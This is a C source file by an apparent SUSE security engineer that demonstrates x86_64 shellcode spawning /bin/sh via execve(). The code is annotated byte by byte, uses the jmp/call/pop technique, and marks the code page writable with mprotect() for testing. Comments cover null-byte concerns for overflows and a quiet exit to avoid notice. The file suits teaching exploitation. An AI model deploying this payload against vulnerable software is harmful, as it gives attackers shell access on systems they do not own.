/*
 * Matthias Gerstner
 * SUSE Linux GmbH
 * matthias.gerstner@suse.com
 */

/*
 * This program sets up an execve() system call to run /bin/sh with empty
 * environment and no extra parameters. This is done using inline assembly and
 * the x86_64 syscall instruction.
 */

/*
 *  This program modifies the .text segment (i.e. the code modifies itself)
 *  which is not allowed by default.
 *
 *  This happens only for demonstration purposes to test the assembler code so
 *  bypassing this restriction is not really relevant for the security exploit
 *  in practice.
 *
 *  To get this code to work for testing we can modify the page protection
 *  during runtime with mprotect() or link with writable text segments.
 *
 *  The ld option -N recently started producing a linker error with
 *  __ehdr_start being undefined. It seems to have to do with the GOT/PLT
 *  table being generated and requiring dynamic linking. Therefore we use the
 *  mprotect approach now.
 */
#define USE_MPROTECT

#ifdef USE_MPROTECT

#	include <sys/mman.h>
#	include <stdint.h>

static void make_test_writable(void *mainptr) {
	// mark main() code writable during runtime, an alternative to linking
	// with -Wl-N and statically
	intptr_t addr = (intptr_t)mainptr;
	// round down to the page size boundary
	addr = addr & (~(intptr_t)(4096-1));
	// allow all operations on the code
	mprotect((void*)addr, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
}

#endif // USE_MPROTECT

int main() {
#ifdef USE_MPROTECT
	make_test_writable(&main);
#endif

	/*
	 * the execve(2) system call takes the following parameters:
	 *
	 * rax: the system call number 0x3b
	 * rdi: a pointer to the string representing the path to the
	 *     program to execute
	 * rsi: a pointer to the argument list (char **) terminated with a
	 *     NULL pointer
	 * rdx: a pointer to the environment list (char **) terminated with a
	 *     NULL pointer
	 */

	__asm__(
		// jump to the call instruction, which will get the stack
		// address to use for our exec() parameter addressing.
		//
		// the offset to jump to needs to be calculated manually by
		// adding the length of the assembler instructions or by
		// disassembling the code. The length of each assembler
		// instruction is annotated in the comment lines following the
		// statements.
	        "jmp . + 0x33\n"                    // 2 bytes
		// retrieve the return address that the call instruction put
		// on the stack into %rbx
		"popq   %rbx\n"                     // 1 byte
		// write the address of the /bin/sh string just after the
		// string data to serve as argv[] list to execve()
		"movq   %rbx,0x8(%rbx)\n"           // 4 bytes
		// make sure the /bin/sh string is null terminated (could have
		// been skipped in case of strcpy() based overflow or other \0
		// based string copy functions)
		"movb   $0x0,0x7(%rbx)\n"           // 4 bytes
		// provide a null pointer terminator for the argv[] and envp[]
		// list to execve()
		"movq   $0x0,0x10(%rbx)\n"          // 8 bytes
		// setup the execve() parameters
		//
		// system call number
		"movq   $0x3b,%rax\n"               // 7 bytes
		// the address of the /bin/sh string, the program to execute
		"movq   %rbx,%rdi\n"                // 3 bytes
		// the address of the address of the /bin/sh string and a
		// following NULL terminator to serve as a parameter list
		"leaq   0x8(%rbx),%rsi\n"           // 4 bytes
		// address of the terminating NULL pointer for the environment
		// list (the program will start with an empty environment)
		"leaq   0x10(%rbx),%rdx\n"          // 4 bytes
		// execute the system call
		"syscall\n"                         // 2 bytes
		// fallback code if execve() should fail: exit with 0
		// thus we keep a low profile, user/administrator might wonder
		// why the program exited but there will be no visible crash
		// if something went wrong.
		"movq   $0x1, %rax\n"               // 7 bytes
		// put constant zero in rbx, without actually using a zero
		// constant
		"xorq   %rbx, %rbx\n"               // 3 bytes
		"int    $0x80\n"                    // 2 bytes
		// jump back to the 'popq' instruction, this will put the
		// return address, the address of the next instruction (i.e.
		// the address to the exec string parameter!) onto the stack
		"call   . - 0x31\n"                 // 5 bytes
		".string \"/bin/sh\"\n"             // 8 bytes
	);
}

